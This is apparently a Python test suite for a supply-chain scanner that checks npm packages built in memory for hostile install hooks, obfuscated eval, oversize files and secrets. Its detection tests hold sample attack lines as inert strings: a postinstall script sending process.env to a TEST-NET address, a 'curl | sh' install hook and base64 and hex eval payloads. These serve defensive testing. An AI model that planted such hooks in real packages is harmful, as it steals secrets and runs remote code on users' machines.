"""Registry verdicts, end to end through scan_package, on packages built in
memory. Two directions, both required:

- detection: hostile patterns still come out SUSPICIOUS (or INCOMPLETE when
  part of the package couldn't be scanned);
- precision: things legitimate packages do (install hooks that fetch a binary,
  launcher executables, test fixtures, media, secrets in tests) do not.

Every "hostile" package here is inert text: network references point at
192.0.2.1 (TEST-NET, never routed) or .invalid hosts, and nothing is executed;
the scanner only reads the archive.
"""

import io
import json
import tarfile
import unittest
from unittest import mock

from lazaret.registry import repo as lazaret_repo


def tarball(files):
    """{path: str|bytes} -> npm-style .tgz bytes (members under package/)."""
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        for path, content in files.items():
            data = content.encode() if isinstance(content, str) else content
            info = tarfile.TarInfo(f"package/{path}")
            info.size = len(data)
            tf.addfile(info, io.BytesIO(data))
    return buf.getvalue()


def scan(files, artifact="npm"):
    data = tarball(files)
    with mock.patch.object(lazaret_repo, "resolve_npm",
                           return_value=("1.0.0", "https://registry.npmjs.org/x/-/x-1.0.0.tgz",
                                         "tgz", artifact, {})), \
            mock.patch.object(lazaret_repo, "http_bytes", return_value=data), \
            mock.patch.object(lazaret_repo, "verify_digest", return_value=None):
        return lazaret_repo.scan_package("npm", "x")


def manifest(**scripts):
    return json.dumps({"name": "x", "version": "1.0.0", "scripts": scripts}, indent=2)


def rules(res, sev_in=None):
    return {i["rule"] for i in res["issues"] if sev_in is None or i["sev"] in sev_in}


ELF = b"\x7fELF\x02\x01\x01" + b"\x00" * 200


class DetectionTests(unittest.TestCase):
    """Hostile patterns must stay SUSPICIOUS."""

    def test_install_script_that_exfiltrates_env(self):
        res = scan({"package.json": manifest(postinstall="node setup.js"),
                    "setup.js": ("const https = require('https');\n"
                                 "const body = JSON.stringify(process.env);\n"
                                 "https.request({host: '192.0.2.1', method: 'POST'}).end(body);\n")})
        self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])
        hook = next(i for i in res["issues"] if i["rule"] == "SC-INSTALL-HOOK")
        self.assertEqual(hook["sev"], "CRITICAL")
        self.assertIn("setup.js", hook["msg"])

    def test_install_script_contacting_exfil_endpoint(self):
        res = scan({"package.json": manifest(preinstall="node ./lib/check.js"),
                    "lib/check.js": "fetch('https://webhook.site/0000-example');\n"})
        self.assertEqual(res["verdict"], "SUSPICIOUS")

    def test_hook_that_pipes_a_download_to_a_shell(self):
        res = scan({"package.json": manifest(install="curl -s http://192.0.2.1/x | sh")})
        self.assertEqual(res["verdict"], "SUSPICIOUS")

    def test_decode_then_execute(self):
        res = scan({"package.json": manifest(),
                    "index.js": "eval(Buffer.from('Y29uc29sZS5sb2coMSk=', 'base64').toString());\n"})
        self.assertEqual(res["verdict"], "SUSPICIOUS")

    def test_hex_hidden_code(self):
        res = scan({"package.json": manifest(),
                    "index.js": 'const f = "\\x65\\x76\\x61\\x6c\\x28\\x61\\x74\\x6f\\x62";\n'})
        self.assertEqual(res["verdict"], "SUSPICIOUS")
        self.assertIn("eval(atob", next(i["msg"] for i in res["issues"] if i["rule"] == "SC-HEXSTR"))

    def test_strong_findings_in_tests_are_not_demoted(self):
        res = scan({"package.json": manifest(),
                    "test/helper.js": "eval(Buffer.from('Y29uc29sZS5sb2coMSk=', 'base64').toString());\n"})
        self.assertEqual(res["verdict"], "SUSPICIOUS")

    def test_oversize_source_is_incomplete(self):
        big = "// filler\n" * (lazaret_repo.MAX_MEMBER // 10 + 10)
        res = scan({"package.json": manifest(), "dist/huge.js": big})
        self.assertEqual(res["verdict"], "INCOMPLETE", res["verdictReason"])

    def test_too_many_files_is_incomplete(self):
        with mock.patch.object(lazaret_repo, "MAX_FILES", 5):
            res = scan({f"f{i}.js": "x\n" for i in range(8)})
        self.assertEqual(res["verdict"], "INCOMPLETE")

    def test_strong_finding_outranks_incomplete(self):
        big = "// filler\n" * (lazaret_repo.MAX_MEMBER // 10 + 10)
        res = scan({"package.json": manifest(install="curl -s http://192.0.2.1/x | sh"),
                    "dist/huge.js": big})
        self.assertEqual(res["verdict"], "SUSPICIOUS")


class PrecisionTests(unittest.TestCase):
    """Legitimate patterns, taken from real packages, must not be SUSPICIOUS."""

    def test_binary_download_install_hook_is_warn(self):
        # esbuild/puppeteer-style: fetch a platform binary, run it to check its version
        res = scan({"package.json": manifest(postinstall="node install.js"),
                    "install.js": ("const https = require('https');\n"
                                   "const cp = require('child_process');\n"
                                   "https.get('https://registry.npmjs.org/pkg-linux-x64/-/x.tgz');\n"
                                   "cp.execFileSync(binPath, ['--version'], {env: {...process.env}});\n")})
        self.assertEqual(res["verdict"], "WARN", res["verdictReason"])

    def test_local_require_via_node_e_is_not_eval(self):
        # core-js: node -e "try{require('./postinstall')}catch(e){}"
        res = scan({"package.json": manifest(postinstall="node -e \"try{require('./postinstall')}catch(e){}\""),
                    "postinstall.js": "console.log('Thank you for using this package');\n"})
        self.assertEqual(res["verdict"], "WARN")
        hook = next(i for i in res["issues"] if i["rule"] == "SC-INSTALL-HOOK")
        self.assertEqual(hook["sev"], "MAJOR")

    def test_publisher_only_scripts_are_not_install_hooks(self):
        res = scan({"package.json": manifest(prepack="wireit", prepublishOnly="npm test", postpublish="echo done")})
        self.assertEqual(res["verdict"], "OK")
        self.assertNotIn("SC-INSTALL-HOOK", rules(res))

    def test_launcher_binaries_are_warn(self):
        res = scan({"lib/cli-64.exe": b"MZ" + b"\x00" * 300})
        self.assertEqual(res["verdict"], "WARN")

    def test_binaries_and_blobs_in_tests_are_inventory(self):
        res = scan({"tests/manylinux/hello-world-x86_64": ELF,
                    "test cases/unit/fixture.tar.xz": b"\xfd7zXZ\x00" + bytes(range(256)) * 20,
                    "Tests/images/noise.bin": bytes((i * 7919) % 256 for i in range(4096))})
        self.assertEqual(res["verdict"], "OK", res["verdictReason"])
        self.assertTrue(all(i["sev"] == "INFO" for i in res["issues"] if i["rule"].startswith("SC-")))

    def test_escaped_binary_data_is_not_obfuscation(self):
        res = scan({"lib/encoding.py": (
            "BOM_SAMPLE = b'\\xff\\xfe{\\x00\"\\x00K0\"\\x00=\\x00\"\\x00\\xab0\"\\x00\\r\\n'\n"   # requests
            "SOCKS = b'\\x00\\x00\\x01\\x7f\\x00\\x00\\x01\\xea\\x60'\n"                         # urllib3
            "UTF8 = b'\\xc3\\xa4\\xc3\\xb6\\xc3\\xbc\\xc3\\x9f'\n"                                 # urllib3
            "PUNCT = '\\x21\\x24\\x2a\\x2d\\x3a\\x3d\\x3f\\x5b\\x5d'\n")})                       # cryptography
        self.assertEqual(res["verdict"], "OK", [i["msg"] for i in res["issues"]])

    def test_large_media_is_not_incomplete(self):
        png = b"\x89PNG\r\n\x1a\n" + bytes((i * 31) % 256 for i in range(lazaret_repo.MAX_MEMBER + 5000))
        res = scan({"docs/figure.png": png})
        self.assertEqual(res["verdict"], "OK", res["verdictReason"])

    def test_media_and_documents_are_not_blobs_or_archives(self):
        icc = b"\x00" * 36 + b"acsp" + bytes((i * 131) % 256 for i in range(3000))
        res = scan({"assets/sRGB.icc": icc,
                    "assets/image.jp2": b"\x00\x00\x00\x0cjP  \r\n\x87\n" + bytes(range(256)) * 12,
                    "docs/diagram.odg": b"PK\x03\x04" + bytes(range(256)) * 8})
        self.assertEqual(res["verdict"], "OK", [i["msg"] for i in res["issues"]])

    def test_secrets_are_reported_but_never_decide(self):
        res = scan({"lib/config.js": 'const password = "hunter2hunter2";\n',
                    "test/keys.js": ("const KEY = `-----BEGIN RSA PRIVATE KEY-----\n"
                                     "MIIEpAIBAAKCAQEA0000000000000000000000000000000000000000000\n`;\n")})
        self.assertEqual(res["verdict"], "OK")
        self.assertTrue({"S-SECRET", "S-TOKEN"} & rules(res), "secrets are still reported")

    def test_pem_header_constant_is_not_a_key(self):
        res = scan({"lib/ssh.py": '_PEM_BEGIN = b"-----BEGIN OPENSSH PRIVATE KEY-----"\n'})
        self.assertNotIn("S-TOKEN", rules(res))

    def test_every_result_explains_itself(self):
        res = scan({"package.json": manifest(postinstall="node install.js"), "install.js": "1;\n"})
        self.assertEqual(res["verdictReason"], "1 weaker supply-chain indicator to review")
        self.assertEqual((res["strongIndicators"], res["weakIndicators"]), (0, 1))


class VerdictPolicyTests(unittest.TestCase):
    def test_ci_fails_on_suspicious_and_incomplete_only(self):
        """`--ci` exits 1 when cmd_scan reports a bad result: a partial scan
        never passes, and WARN is for review, not for failing a build."""
        import contextlib
        import os
        import tempfile

        for verdict, bad in (("OK", False), ("WARN", False), ("INCOMPLETE", True), ("SUSPICIOUS", True)):
            with self.subTest(verdict=verdict), tempfile.TemporaryDirectory() as d:
                store = lazaret_repo.Store(os.path.join(d, "r.db"))
                try:
                    res = scan({"index.js": "1;\n"})
                    res["verdict"] = verdict
                    with mock.patch.object(lazaret_repo, "scan_package", return_value=res), \
                            contextlib.redirect_stdout(io.StringIO()):
                        self.assertIs(lazaret_repo.cmd_scan(store, ["npm:x"], False, True), bad)
                finally:
                    # Windows can't delete the temp dir while the database is open
                    store.conn.close()

    def test_test_path_detection(self):
        for path, expected in [("tests/a.py", True), ("pkg/test cases/x.sh", True), ("meson/unittests/t.py", True),
                               ("src/test_util.py", True), ("lib/a.spec.js", True), ("src/pkg/contest.py", False),
                               ("lib/attestation/sign.js", False), ("src/main.py", False)]:
            with self.subTest(path=path):
                self.assertIs(lazaret_repo.is_test_path(path), expected)


if __name__ == "__main__":
    unittest.main()
